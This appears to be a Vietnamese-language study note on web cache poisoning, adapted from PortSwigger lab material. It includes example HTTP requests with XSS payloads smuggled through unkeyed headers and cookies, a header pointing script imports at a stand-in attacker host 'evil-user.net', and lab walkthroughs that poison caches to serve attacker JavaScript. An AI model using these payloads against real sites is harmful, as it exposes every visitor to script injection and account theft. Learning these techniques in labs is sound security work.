# Exploiting cache design flaws

Trong phần này, chúng ta sẽ xem xét kỹ hơn cách các lỗ hổng đầu độc bộ nhớ đệm web có thể phát sinh do các lỗi chung trong thiết kế bộ nhớ đệm. Chúng tôi cũng sẽ trình bày cách khai thác những lỗi này.

Tóm lại, các trang web dễ bị đầu độc bộ nhớ đệm web nếu chúng xử lý dữ liệu đầu vào không có khóa theo cách không an toàn và cho phép lưu trữ các phản hồi HTTP tiếp theo. Lỗ hổng này có thể được sử dụng làm phương thức phân phối cho nhiều cuộc tấn công khác nhau.

# Using web cache poisoning to deliver an XSS attack

Có lẽ lỗ hổng đầu độc bộ nhớ đệm web đơn giản nhất để khai thác là khi dữ liệu đầu vào không có khóa được phản ánh trong phản hồi có thể lưu vào bộ nhớ đệm mà không được khử trùng đúng cách.

Ví dụ, hãy xem xét yêu cầu và phản hồi sau:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Tại đây, giá trị của tiêu đề X-Forwarded-Host được sử dụng để tạo động URL hình ảnh Open Graph, sau đó được phản ánh trong phản hồi. Quan trọng đối với việc đầu độc bộ nhớ đệm web, tiêu đề X-Forwarded-Host thường không được khóa. Trong ví dụ này, bộ nhớ đệm có khả năng bị nhiễm độc bằng phản hồi chứa tải trọng XSS đơn giản:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

Nếu phản hồi này được lưu trong bộ nhớ đệm, tất cả người dùng đã truy cập `/en?region=uk` sẽ được phục vụ tải trọng XSS này. Ví dụ này chỉ khiến cảnh báo xuất hiện trên trình duyệt của nạn nhân, nhưng một cuộc tấn công thực sự có khả năng đánh cắp mật khẩu và chiếm đoạt tài khoản người dùng.

# Using web cache poisoning to exploit unsafe handling of resource imports

Một số trang web sử dụng tiêu đề không có khóa để tạo URL động nhằm nhập tài nguyên, chẳng hạn như tệp JavaScript được lưu trữ bên ngoài. Trong trường hợp này, nếu kẻ tấn công thay đổi giá trị của tiêu đề thích hợp thành tên miền mà chúng kiểm soát, chúng có khả năng thao túng URL để trỏ đến tệp JavaScript độc hại của chúng.

Nếu phản hồi chứa URL độc hại này được lưu vào bộ nhớ đệm, tệp JavaScript của kẻ tấn công sẽ được nhập và thực thi trong phiên trình duyệt của bất kỳ người dùng nào có yêu cầu có khóa bộ nhớ đệm trùng khớp.

```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

--- 

## Ví dụ: Web cache poisoning with an unkeyed header

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

Ở trang chủ ta thấy nó có tải thêm các file js, thêm header `X-Forwarded-Host: example.com` ta thấy các file js này sẽ được tải từ trang `example.com`:

![alt text](image-3.png)

Từ đây ta lên kịch bản: Ở server exploit thêm 1 đoạn js để khai thác:

![alt text](image-4.png)

Đổi đường dẫn về trùng với path tải file js:

![alt text](image-5.png)

Bây giờ đổi header `X-Forwarded-Host: exploit-0a4d00f803e09e4c824138cd017500ed.exploit-server.net`

![alt text](image-6.png)

Ta thấy nó được lưu vào cache, nên người tiếp theo truy cập trang chủ nó cũng sẽ lấy js từ server exploit nên sẽ thực thi js ta đã tiêm.

Sau `max-age:30` thì nó mới hết cache và sửa đổi lại thành như cũ

---

# Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookie thường được sử dụng để tạo nội dung động trong phản hồi. Một ví dụ phổ biến có thể là cookie chỉ ra ngôn ngữ ưa thích của người dùng, sau đó được sử dụng để tải phiên bản tương ứng của trang:

```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

Trong ví dụ này, phiên bản tiếng Ba Lan của bài đăng trên blog đang được yêu cầu. Lưu ý rằng thông tin về phiên bản ngôn ngữ nào sẽ phục vụ chỉ có trong tiêu đề `Cookie`. Giả sử khóa bộ đệm chứa dòng yêu cầu và tiêu đề `Host` nhưng không chứa tiêu đề `Cookie`. Trong trường hợp này, nếu phản hồi cho yêu cầu này được lưu vào bộ nhớ đệm, thì tất cả người dùng tiếp theo cố gắng truy cập bài đăng trên blog này cũng sẽ nhận được phiên bản tiếng Ba Lan, bất kể họ thực sự chọn ngôn ngữ nào.

Việc xử lý cookie bị lỗi này của bộ nhớ đệm cũng có thể bị khai thác bằng các kỹ thuật đầu độc bộ nhớ đệm web. Tuy nhiên, trên thực tế, vectơ này tương đối hiếm khi so sánh với đầu độc bộ nhớ đệm dựa trên tiêu đề. Khi tồn tại lỗ hổng đầu độc bộ nhớ đệm dựa trên cookie, chúng có xu hướng được xác định và giải quyết nhanh chóng vì người dùng hợp pháp đã vô tình đầu độc bộ nhớ đệm.

---

## Ví dụ: Web cache poisoning with an unkeyed cookie

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

Để ý ta thấy cookie được đưa vào đoạn mã js, ta thử thay đổi cookie này và thấy nó được áp vào:

![alt text](image-7.png)

![alt text](image-8.png)

Với cookie `fehost=someString"-alert(1)-"someString` ta có thể thực thi `alert`:

![alt text](image-9.png)

---

# Using multiple headers to exploit web cache poisoning vulnerabilities

Một số trang web dễ bị khai thác bằng cách đầu độc bộ nhớ đệm web đơn giản, như đã trình bày ở trên. Tuy nhiên, một số khác lại yêu cầu các cuộc tấn công phức tạp hơn và chỉ trở nên dễ bị tấn công khi kẻ tấn công có thể tạo ra một yêu cầu thao túng nhiều dữ liệu đầu vào không có khóa.

Ví dụ, giả sử một trang web yêu cầu giao tiếp an toàn bằng HTTPS. Để thực thi điều này, nếu nhận được yêu cầu sử dụng giao thức khác, trang web sẽ tự động tạo chuyển hướng đến chính nó sử dụng HTTPS:

```http
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

Bản thân hành vi này không hẳn là dễ bị tổn thương. Tuy nhiên, bằng cách kết hợp điều này với những gì chúng ta đã tìm hiểu trước đó về lỗ hổng trong các URL được tạo động, kẻ tấn công có khả năng khai thác hành vi này để tạo ra phản hồi có thể lưu vào bộ nhớ đệm nhằm chuyển hướng người dùng đến một URL độc hại.

---

## Ví dụ: Web cache poisoning with multiple headers

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

































